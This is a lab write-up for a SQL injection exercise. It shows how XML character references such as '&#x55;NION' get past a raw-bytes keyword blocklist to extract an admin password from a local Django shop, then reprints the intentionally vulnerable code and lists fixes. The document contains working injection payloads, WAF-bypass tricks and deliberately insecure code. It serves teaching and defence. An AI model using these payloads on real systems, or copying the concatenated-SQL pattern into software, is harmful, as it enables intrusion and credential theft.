# Lab 18 — SQL injection with filter bypass via XML encoding

## 1. Lab overview

| Field | Value |
| --- | --- |
| PortSwigger reference | <https://portswigger.net/web-security/sql-injection/lab-sql-injection-with-filter-bypass-via-xml-encoding> |
| Lab id | `psw-sqli-18-filter-bypass-xml-encoding` |
| Vulnerability class | SQL Injection — UNION-based extraction via XML-entity filter bypass |
| CWE | [CWE-89 — Improper Neutralization of Special Elements used in an SQL Command](https://cwe.mitre.org/data/definitions/89.html) / [CWE-20 — Improper Input Validation](https://cwe.mitre.org/data/definitions/20.html) |
| Backend | SQLite (single-service Django app) |
| Host URL | <http://127.0.0.1:18018/> |
| Flag | `FLAG{psw-sqli-18-filter-bypass-xml-encoding-admin-access}` |

### Objective

The storefront offers a client-side "Check stock" widget that `POST`s an XML
document to `/product/stock`. A raw-bytes keyword blocklist sits in front of
that endpoint and refuses any body that contains `SELECT`, `UNION`, `FROM`,
or `WHERE`. The attacker's job is to smuggle a `UNION SELECT` past the
filter, pull the administrator's password out of the `users` table through
the reflected stock count, sign in with it, and pick up the flag from
`/my-account`.

---

## 2. Exploit walkthrough

The order of operations on the server is the whole vulnerability: the
blocklist reads the raw bytes, but the XML parser subsequently decodes
numeric character references like `&#x55;` into the letter `U`. Encoding
any single character of a blocked keyword makes the raw body "clean"
while the post-parse string is a perfectly valid SQL keyword.

**Step 1 — baseline, benign request**

```http
POST /product/stock HTTP/1.1
Host: 127.0.0.1:18018
Content-Type: application/xml
Content-Length: 81

<stockCheck><productId>1</productId><storeId>1</storeId></stockCheck>
```

The server runs `SELECT count FROM stock WHERE product_id = 1` and echoes
the integer `42` back as `text/plain`.

**Step 2 — confirm the filter**

```http
POST /product/stock HTTP/1.1
Host: 127.0.0.1:18018
Content-Type: application/xml

<stockCheck><productId>1 UNION SELECT 1</productId><storeId>1</storeId></stockCheck>
```

Response: `403` — `Blocked by WAF: forbidden SQL keyword 'UNION' in request body.`
The filter fires on the raw bytes in `request.body` before parsing begins.

**Step 3 — smuggle keywords through XML numeric character references**

`&#x55;` decodes to `U`, `&#x53;` to `S`, `&#x46;` to `F`, `&#x57;` to `W`.
Encoding just one letter of each keyword is enough: the raw bytes do not
contain the literal strings `UNION`, `SELECT`, `FROM`, or `WHERE`, so the
blocklist lets them through. `xml.etree.ElementTree.fromstring` then
decodes them as part of normal XML parsing.

```http
POST /product/stock HTTP/1.1
Host: 127.0.0.1:18018
Content-Type: application/xml

<stockCheck>
  <productId>0 &#x55;NION &#x53;ELECT password &#x46;ROM users &#x57;HERE username='administrator'</productId>
  <storeId>1</storeId>
</stockCheck>
```

After the parser runs, `productId` holds the literal string:

```
0 UNION SELECT password FROM users WHERE username='administrator'
```

It is concatenated without quoting into:

```sql
SELECT count FROM stock WHERE product_id = 0 UNION SELECT password FROM users WHERE username='administrator'
```

`product_id = 0` matches nothing in `stock`, so the only row in the result
set is the administrator's password. SQLite happily unions an integer
column with a text column, and the view reflects `str(row[0])` back in the
response body — the administrator password comes out in plain text.

**Step 4 — log in and collect the flag**

```http
POST /login HTTP/1.1
Host: 127.0.0.1:18018
Content-Type: application/x-www-form-urlencoded

username=administrator&password=<recovered-token>
```

The session cookie now identifies an admin user. `GET /my-account`
renders `FLAG{psw-sqli-18-filter-bypass-xml-encoding-admin-access}`.

---

## 3. Vulnerable code

### Endpoint: `POST /product/stock`

The blocklist is declared at module scope and applied to the raw body
before any structural parsing.

[shop/views.py:56-57](shop/views.py#L56-L57)

```python
BLOCKED_KEYWORDS = (b"SELECT", b"UNION", b"FROM", b"WHERE")
MAX_BODY_BYTES = 16 * 1024
```

[shop/views.py:67-72](shop/views.py#L67-L72)

```python
def _contains_blocked_keyword(body: bytes) -> str | None:
    upper = body.upper()
    for keyword in BLOCKED_KEYWORDS:
        if keyword in upper:
            return keyword.decode()
    return None
```

The filter inspects `body.upper()`, i.e. the bytes straight off the wire.
XML entities like `&#x55;` do not match any keyword at this stage.

[shop/views.py:90-100](shop/views.py#L90-L100)

```python
    body = request.body[:MAX_BODY_BYTES]

    # WAF: raw-bytes blocklist. Runs before XML parsing, so any SQL
    # keyword present as literal text here gets the request rejected.
    hit = _contains_blocked_keyword(body)
    if hit is not None:
        return HttpResponse(
            f"Blocked by WAF: forbidden SQL keyword '{hit}' in request body.",
            status=403,
            content_type="text/plain; charset=utf-8",
        )
```

The parse — which is what actually decodes the entities back into letters —
happens strictly *after* the filter has already accepted the request.

[shop/views.py:105-114](shop/views.py#L105-L114)

```python
    try:
        root = ET.fromstring(body)
    except ET.ParseError as exc:
        return HttpResponse(
            f"Invalid XML: {exc}",
            status=400,
            content_type="text/plain; charset=utf-8",
        )

    product_id = (root.findtext("productId") or "").strip()
```

The string pulled out of the XML element is then concatenated directly
into a SQL query — unquoted, because the original author assumed
`productId` was always an integer.

[shop/views.py:122-131](shop/views.py#L122-L131)

```python
    # Vulnerable SQL. productId lands in the query unquoted - the
    # endpoint was written assuming it was always an integer.
    query = (
        "SELECT count FROM stock "
        "WHERE product_id = " + product_id
    )
    try:
        with connection.cursor() as cursor:
            cursor.execute(query)
            row = cursor.fetchone()
```

Finally, the first column of the first row is reflected verbatim in the
response. This is the exfiltration channel that turns a UNION into
single-request data recovery.

[shop/views.py:145-150](shop/views.py#L145-L150)

```python
    # Reflect the first column verbatim: the attacker's UNION rides
    # back out through this single field.
    return HttpResponse(
        str(row[0]),
        content_type="text/plain; charset=utf-8",
    )
```

### Supporting model

[shop/models.py:18-37](shop/models.py#L18-L37) — `Stock` is the table
being queried; the comment explicitly notes that SQLite will union
mixed-type columns without complaint, which is why `password` can come
back through a column declared as `IntegerField`.

[shop/models.py:40-51](shop/models.py#L40-L51) — `User` stores the
administrator password in cleartext so that a single UNION returns a
useful value.

### Seeded data

[shop/management/commands/seed.py:53](shop/management/commands/seed.py#L53)
and
[shop/management/commands/seed.py:73](shop/management/commands/seed.py#L73)
— the administrator password is freshly generated per container with
`secrets.token_urlsafe(12)`, so brute-force is not viable and the intended
path is extraction via the reflected UNION.

### Client widget

[shop/templates/shop/home.html:54-64](shop/templates/shop/home.html#L54-L64)
— the legitimate browser flow that explains the request shape the
attacker is replaying.

---

## 4. Why the vulnerability exists

| Root cause | Effect |
| --- | --- |
| **Filter runs on raw bytes; the SQL engine receives the parsed bytes** | The two layers disagree about what the "input" is. Anything one of them normalises that the other does not is a smuggling channel. Here it is XML numeric character references. |
| **String concatenation of a parsed XML field into SQL** | `productId` is trusted as a number but never validated, quoted, or bound — a classic untyped concatenation. |
| **Reflection of the first column verbatim** | Turns blind/inference injection into single-request in-band data recovery via `UNION SELECT`. |
| **Blocklist instead of allow-list** | Keyword lists are famously leaky: comment insertion (`UN/**/ION`), case tricks, whitespace tricks, encodings (URL, Unicode, XML, JSON unicode escapes), and so on. `SELECT`, `UNION`, `FROM`, `WHERE` are not the only SQL keywords either (`INSERT`, `UPDATE`, `WITH`, `VALUES`, `RETURNING`, etc.). |
| **Administrator password stored in cleartext** | A single successful read is enough to take over the account. |

The defining bug is the **ordering**: filter-before-parse is structurally
wrong whenever the parser performs any canonicalisation of its input.
XML entities, HTML entities, URL encoding, Unicode normalisation, and
gzip/deflate decoding all belong to the same family of pitfalls.

---

## 5. Code-level mitigation

### 5.1 Parameterise the query

The productId value must be bound as data, never inlined as text. Combined
with a type check (`int(product_id)`), the payload surface disappears
entirely — the driver rejects a non-integer before it reaches SQLite.

```python
# shop/views.py — fixed
try:
    product_id_int = int(product_id)
except ValueError:
    return HttpResponse("productId must be an integer.", status=400)

with connection.cursor() as cursor:
    cursor.execute(
        "SELECT count FROM stock WHERE product_id = %s",
        [product_id_int],
    )
    row = cursor.fetchone()
```

Once the value is bound as an integer, `0 UNION SELECT ...` cannot be
parsed as SQL — it is just an invalid number and the request fails at
step one.

### 5.2 Prefer the ORM

```python
from .models import Stock

try:
    stock = Stock.objects.get(product_id=int(product_id))
except (ValueError, Stock.DoesNotExist):
    return HttpResponse("Out of stock.", content_type="text/plain")
return HttpResponse(str(stock.count), content_type="text/plain")
```

Django's ORM always parameterises and coerces types.

### 5.3 If the blocklist must stay, decode and normalise *before* filtering

The ordering must be inverted: parse first, then inspect. The thing the
SQL engine will see is the thing the filter must see.

```python
try:
    root = ET.fromstring(request.body[:MAX_BODY_BYTES])
except ET.ParseError as exc:
    return HttpResponse(f"Invalid XML: {exc}", status=400)

product_id = (root.findtext("productId") or "").strip()
hit = _contains_blocked_keyword(product_id.upper().encode())
if hit is not None:
    return HttpResponse(f"Blocked: {hit}", status=403)
```

This is still a blocklist — therefore still fragile — but it at least
closes the specific entity-smuggling hole. The better fix (5.1/5.2)
makes the filter unnecessary.

### 5.4 Remove the filter entirely

A blocklist of SQL keywords is a code smell. It signals that the app
cannot prove its queries are safe and is trying to paper over the
underlying concatenation. Fixing the query makes the filter redundant;
keeping the filter creates a false sense of security. Delete it once the
parameterisation is in.

### 5.5 Harden the XML parser against XXE

`xml.etree.ElementTree` in the Python standard library does not resolve
external entities by default, so XXE is not open here. For any code that
uses `lxml` or `xmlrpc`, switch to `defusedxml`:

```python
from defusedxml.ElementTree import fromstring
root = fromstring(body)
```

This is orthogonal to the SQLi — it addresses the other classic XML
vulnerability class (external entity resolution / billion-laughs).

### 5.6 Do not reflect raw database columns in responses

Return a structured JSON envelope with a specific shape
(`{"in_stock": true, "count": 42}`). An attacker who does smuggle a
UNION into a future query still cannot read the extra column back out if
the response layer only serialises integers with a known schema.

### 5.7 Hash stored passwords

Use `django.contrib.auth.hashers.make_password`. Even if a future SQLi
leaks the `users` table, what comes back is a PBKDF2/Argon2 hash that
cannot be used to log in directly.

---

## 6. Network / infrastructure-level mitigation

### 6.1 The WAF is not a reliable XML parser

The fundamental lesson of this lab is that any filter that inspects a
textual request body has to either:

1. Fully canonicalise the body using the same rules as the application's
   parser (XML entity decoding, CDATA unwrap, whitespace folding,
   attribute-vs-text distinction, namespace handling, etc.), or
2. Only filter on attributes the parser cannot change (size, content
   type, schema compliance).

A signature-matching WAF that does (1) partially will always be
bypassable. Production ModSecurity rule packs try, and are regularly
bypassed by tricks like CDATA sections (`<![CDATA[UNION]]>`), entity
definitions (`<!ENTITY u "UNION">`), mixed encodings, or character
references in less-obvious places (inside attribute values, inside
processing instructions). Treat the WAF as a telemetry tool, not a
control.

### 6.2 Strict content-type and schema validation at the edge

An API gateway or reverse proxy can enforce:

- `Content-Type: application/xml` (reject `text/xml`, `*/*`, or absent).
- `Content-Length` cap (this app caps at 16 KiB — do the same at the
  edge).
- XSD schema validation: `productId` must be `xs:integer`. A schema
  failure at the gateway means the request never reaches Django.
- DTD / entity-expansion disabled at the gateway's parser too.

```xml
<xs:schema xmlns:xs="http://www.w3.org/2001/XMLSchema">
  <xs:element name="stockCheck">
    <xs:complexType><xs:sequence>
      <xs:element name="productId" type="xs:integer"/>
      <xs:element name="storeId"   type="xs:integer"/>
    </xs:sequence></xs:complexType>
  </xs:element>
</xs:schema>
```

XSD validation rejects any `productId` that isn't a pure integer — no
spaces, no letters, no character references decoding to letters.

### 6.3 Least-privilege database account

The container runs SQLite in-process, but the same principle applies to
Postgres/MySQL: the DB user should have `SELECT` only on the tables it
needs and no access to system tables such as `sqlite_master`,
`information_schema`, `pg_user`, `mysql.user`. Had the user been limited
to the `stock` table, the UNION here would have errored out on the
`users` reference.

### 6.4 Network segmentation

`docker-compose.yml:10` binds `127.0.0.1:18018:8000` — loopback-only. In
production, keep the app behind a reverse proxy and the DB on a private
network with no public interface and no egress.

### 6.5 Logging and alerting

Anomalous indicators to alert on:

- Stock-check responses whose body does not match `^\d+$`.
- SQL errors on `/product/stock`.
- Sudden spikes of `400 Invalid XML` or `403` responses from a single
  client.
- XML bodies containing numeric character references at all — legitimate
  clients in this app never emit them (see
  [shop/templates/shop/home.html:43-48](shop/templates/shop/home.html#L43-L48)
  which only escapes `& < >`).

---

## 7. Defense-in-depth checklist

- [ ] Parameterised queries everywhere; no string concatenation into SQL.
- [ ] Coerce numeric path/body fields to `int` / `Decimal` before binding.
- [ ] Prefer the Django ORM; treat raw SQL as a code-review trigger.
- [ ] No blocklist-based WAF between the client and the parser — or if
      one is present, it parses and normalises the payload before
      inspecting.
- [ ] XSD/JSON-schema validation of request bodies at the edge.
- [ ] XML parsers configured with entity resolution disabled
      (`defusedxml`, or equivalent for the language/library in use).
- [ ] Response layer serialises specific fields with a known schema; no
      blanket reflection of result-set columns.
- [ ] Passwords stored as salted hashes (Argon2id / bcrypt / PBKDF2).
- [ ] Application DB user has least privilege on a per-table basis.
- [ ] Query errors are never reflected to the client (note the 500
      branch in
      [shop/views.py:132-137](shop/views.py#L132-L137) that does exactly
      that — useful for a lab, removed in production).
- [ ] Structured logs with alerts on SQL errors and on non-conforming
      response bodies from numeric endpoints.
- [ ] SAST rules catching `cursor.execute("..." + x)` and
      `cursor.execute(f"...{x}...")`.

---

## 8. References

- PortSwigger Web Security Academy — [SQL injection with filter bypass via XML encoding](https://portswigger.net/web-security/sql-injection/lab-sql-injection-with-filter-bypass-via-xml-encoding)
- OWASP — [SQL Injection Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/SQL_Injection_Prevention_Cheat_Sheet.html)
- OWASP — [XML Security Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/XML_Security_Cheat_Sheet.html)
- OWASP — [Input Validation Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Input_Validation_Cheat_Sheet.html)
- CWE-89 — <https://cwe.mitre.org/data/definitions/89.html>
- CWE-20 — <https://cwe.mitre.org/data/definitions/20.html>
- W3C — [XML 1.0, section 4.1 "Character and Entity References"](https://www.w3.org/TR/xml/#sec-references)
- PyPI — [`defusedxml`](https://pypi.org/project/defusedxml/)
- Django docs — [Performing raw SQL queries](https://docs.djangoproject.com/en/5.0/topics/db/sql/#performing-raw-queries) (parameter-binding warning)
